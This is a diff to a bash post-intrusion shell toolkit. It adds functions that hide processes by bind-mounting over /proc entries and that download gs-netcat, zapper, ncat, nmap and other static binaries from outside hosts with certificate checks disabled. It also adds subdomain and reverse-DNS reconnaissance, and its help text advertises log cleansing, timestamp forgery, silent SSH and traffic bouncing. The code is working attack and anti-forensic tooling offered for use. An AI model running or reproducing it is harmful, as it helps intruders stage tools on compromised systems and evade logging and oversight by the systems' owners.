@@ -250,29 +250,130 @@ ${CDC} bounce 31337 8.8.8.8   53   ${CN}# Forward 31337 to 8.8.8.8's 53$"
     HS_INFO "Traffic to _this_ host's ${CDY}${fport}${CDM} is now forwarded to ${CDY}${dstip}:${dstport}"
 }
 
+crt() {
+    [ $# -ne 1 ] && { HS_ERR "crt <domain-name>"; return 255; }
+    command -v jq >/dev/null || { HW_ERR "Command not found: jq"; return 255; }
+    command -v anew >/dev/null || { HW_ERR "Command not found: anew"; return 255; }
+    curl -fsSL "https://crt.sh/?q=${1:?}&output=json" --compressed | jq -r '.[].common_name,.[].name_value' | anew | sed 's/^\*\.//g' | tr '[:upper:]' '[:lower:]'
+}
+
+rdns () {
+    curl -fsSL "https://lookup.segfault.net/api/v1/download?ip_address=${1:?}&limit=10&apex_domain=${2}" | column -t -s,
+}
+
+hide() {
+    local _pid="${1:-$$}"
+    [[ -L /etc/mtab ]] && { cp /etc/mtab /etc/mtab.bak; mv /etc/mtab.bak /etc/mtab; }
+    [[ $_pid =~ ^[0-9]+$ ]] && { mount -n --bind /dev/shm /proc/$_pid && HS_INFO "PID $_pid is now hidden"; return; }
+    local _argstr
+    for _x in "${@:2}"; do _argstr+=" '${_x//\'/\'\"\'\"\'}'"; done
+    [[ $(bash -c "ps -o stat= -p \$\$") =~ \+ ]] || exec bash -c "mount -n --bind /dev/shm /proc/\$\$; exec \"$1\" $_argstr"
+    bash -c "mount -n --bind /dev/shm /proc/\$\$; exec \"$1\" $_argstr"
+}
+
+hs_mkhome() {
+    [ -d "${XHOME}" ] && return 255
+    mkdir -p "${XHOME:?}" 2>/dev/null || return
+    echo -e ">>> Using ${CDY}${XHOME}${CN}. ${CF}[will auto-destruct on exit]${CN}"
+    echo -e ">>> Type ${CDC}keep${CN} to disable auto-destruct on exit."
+    # [[ "$PATH" == "$XHOME"* ]] || export PATH="${XHOME}:$PATH"
+    export PATH="${XHOME}:$PATH"
+}
+
 # Keep this seperate because this actually creates data.
 mk() {
-    mkdir -p "${XHOME:?}" 2>/dev/null
     export HOME="${XHOME}"
-    echo -e "${CDM}HOME set to ${CDY}${XHOME}${CN} ${CF}[will auto-destruct on exit]${CN}"
+    echo -e "${CDM}HOME set to ${CDY}${XHOME}${CN}"
     echo -e "Undo with ${CDC}export HOME='${_HS_HOME_ORIG}'${CN}"
+    hs_mkhome || return
+}
+
+keep() {
+    touch "${XHOME}/.keep" 2>/dev/null
+    HS_INFO "Wont delete ${CDY}${XHOME}${CDM} on exit"
 }
 
 bin() {
-    mkdir -p "${XHOME}" 2>/dev/null
-    export PATH="${XHOME}:$PATH"
+    local arch="$(uname -m)"
+    local os="$(uname -s)"
+    local a
 
-    HS_WARN "NOT YET IMPLEMENTED"
+    [ -z "$os" ] && os="Linux"
+    [ -z "$arch" ] && arch="x86_64"
+
+    a="${arch}-${os}"
+
+    hs_mkhome
+
+    bin_dl() {
+        local dst="${XHOME}/${1:?}"
+        local str="${CDM}Downloading ${CDC}${1:?}${CDM}........................................"
+        echo -en "${str:0:64}"
+        [ -s "${dst}" ] || rm -f "${dst:?}" 2>/dev/null
+        command -v "${1}" >/dev/null   && { echo -e "[${CDY}SKIPPED${CDM}]${CN}"; return 0; }
+        { err=$(dl "${2:?}"  2>&1 >&3 3>&-); } >"${XHOME}/${1:?}" 3>&1 || { echo -e ".[${CR}FAILED${CDM}]${CN}${CF}\n---> ${2}\n---> ${err}${CN}"; return 255; }
+        chmod 711 "${XHOME}/${1}"
+        echo -e ".....[${CDG}OK${CDM}]${CN}"
+    }
+
+    bin_dl gs-netcat "https://github.com/hackerschoice/gsocket/releases/latest/download/gs-netcat_${os,,}-${arch}"
+    bin_dl zapper    "https://github.com/hackerschoice/zapper/releases/latest/download/zapper-${os,,}-${arch}"
+    bin_dl curl      "https://bin.ajam.dev/${a}/curl"
+    bin_dl rg        "https://bin.ajam.dev/${a}/ripgrep"
+    bin_dl fd        "https://bin.ajam.dev/${a}/fd-find"
+    bin_dl anew      "https://bin.ajam.dev/${a}/anew"
+    bin_dl ping      "https://bin.ajam.dev/${a}/ping"
+    bin_dl nc        "https://bin.ajam.dev/${a}/ncat"
+    bin_dl jq        "https://bin.ajam.dev/${a}/jq"
+    bin_dl netstat   "https://bin.ajam.dev/${a}/netstat"
+    bin_dl rsync     "https://bin.ajam.dev/${a}/rsync"
+    bin_dl strace    "https://bin.ajam.dev/${a}/strace"
+    bin_dl script    "https://bin.ajam.dev/${a}/Baseutils/util-linux/script"
+    bin_dl awk       "https://bin.ajam.dev/${a}/Baseutils/gawk"
+    bin_dl base64    "https://bin.ajam.dev/${a}/Baseutils/base64"
+    bin_dl gzip      "https://bin.ajam.dev/${a}/Baseutils/gzip"
+    bin_dl hexdump   "https://bin.ajam.dev/${a}/Baseutils/hexdump"
+    bin_dl zgrep     "https://bin.ajam.dev/${a}/Baseutils/zgrep"
+    bin_dl grep      "https://bin.ajam.dev/${a}/Baseutils/grep"
+    bin_dl tar       "https://bin.ajam.dev/${a}/Baseutils/tar"
+    bin_dl nmap      "https://bin.ajam.dev/${a}/nmap"
+    bin_dl tcpdump   "https://bin.ajam.dev/${a}/tcpdump"
+
+    echo -e ">>> ${CDG}Download COMPLETED${CN}"
+
+    unset -f bin_dl
 }
 
 hs_exit() {
     cd /tmp || cd /dev/shm || cd /
-    [ -n "$XHOME" ] && [ -d "$XHOME" ] && rm -rf "${XHOME:?}"
+    [ "${#_hs_bounce_src[@]}" -gt 0 ] && HS_WARN "Bounce still set in iptables. Type ${CDC}unbounce${CN} to stop the forward."
+    [ -n "$XHOME" ] && [ -d "$XHOME" ] && {
+        if [ -f "${XHOME}/.keep" ]; then
+            HS_WARN "Keeping ${CDY}${XHOME}${CN}"
+        else
+            echo -e ">>> Cleansing ${CDY}${XHOME}${CN}"
+            rm -rf "${XHOME:?}"
+        fi
+    }
     [ -t 1 ] && echo -e "${CW}>>>>> 📖 More tips at https://thc.lorg/tips${CN} 😘"
     kill -9 $$
 }
 
 [ -z "$BASH" ] && TRAPEXIT() { hs_exit; } #zsh
+
+hs_init_dl() {
+    if command -v curl >/dev/null; then
+        dl() {
+            curl -fsSLk --proto-default https --connect-timeout 7 --retry 3 "${1:?}"
+        }
+    elif command -v wget >/dev/null; then
+        dl() { wget -Op --no-check-certificate --connect-timeout=7 --dns-timeout=7 "${1:?}";}
+    else
+        dl() {
+            HS_ERR "Not found: curl"
+        }
+    fi
+}
 
 ### Functions (temporary)
 hs_init() {
@@ -303,6 +404,7 @@ ${CY}>>>>> ${CDC}curl -obash -SsfL 'https://bin.ajam.dev/$(uname -m)/bash && chm
         HS_SSH_OPT+=("-oKexAlgorithms=+diffie-hellman-group1-sha1")
         HS_SSH_OPT+=("-oHostKeyAlgorithms=+ssh-dss")
     }
+    hs_init_dl
 }
 
 hs_init_alias() {
@@ -344,7 +446,7 @@ xhelp() {
     echo -en "\
 ${CDC} xlog '1\.2\.3\.4' /var/log/auth.log   ${CDM}Cleanse log file
 ${CDC} xsu username                          ${CDM}Switch user
-${CDC} xtmux                                 ${CDM}Start 'hidden' tmux
+${CDC} xtmux                                 ${CDM}'hidden' tmux
 ${CDC} xssh                                  ${CDM}Silently log in to remote host
 ${CDC} bounce <port> <dst-ip> <dst-port>     ${CDM}Bounce tcp traffic to destination
 ${CDC} burl http://ipinfo.io 2>/dev/null     ${CDM}Request URL ${CN}${CF}[no https support]
@@ -353,6 +455,9 @@ ${CDC} shred file                            ${CDM}Securely delete a file
 ${CDC} notime <file> rm -f foo.dat           ${CDM}Execute a command at the <file>'s ctime & mtime
 ${CDC} notime_cp <src> <dst>                 ${CDM}Copy file. Keep birth-time, ctime, mtime & atime
 ${CDC} find_subdomain .foobar.com            ${CDM}Search files for sub-domain
+${CDC} crt foobar.com                        ${CDM}Query crt.sh for all sub-domains
+${CDC} rdns 1.2.3.4                          ${CDM}Reverse DNS from multiple public databases
+${CDC} hide <pid>                            ${CDM}Hide a process
 ${CDC} bin                                   ${CDM}Download useful static binaries
 ${CDC} xhelp                                 ${CDM}This help"
     echo -e "${CN}"
@@ -368,11 +473,13 @@ xhelp
 ### Finishing
 str=""
 [ -z "$BIN" ] && {
-    echo -e "Type ${CDC}mk${CN} to use HOME=${CDY}${XHOME}${CN}"
-    str="Memory only. The filesystem is UNTOUCHED."
+    echo -e ">>> Type ${CDC}mk${CN} to set HOME=${CDY}${XHOME}${CN}"
+    str="No data was written to the filesystem"
 }
+echo -e ">>> Tweaking environment variables to log less     ${CN}[${CDG}DONE${CN}]"
+echo -e ">>> Creating aliases to make commands log less     ${CN}[${CDG}DONE${CN}]"
 echo -e ">>> ${CG}Setup complete. ${CF}${str}${CN}"
 
 # unset all functions that are no longer needed.
-unset -f hs_init hs_init_alias hs_init_shell
+unset -f hs_init hs_init_alias hs_init_dl hs_init_shell
 unset BIN str SSH_CONNECTION SSH_CLIENT
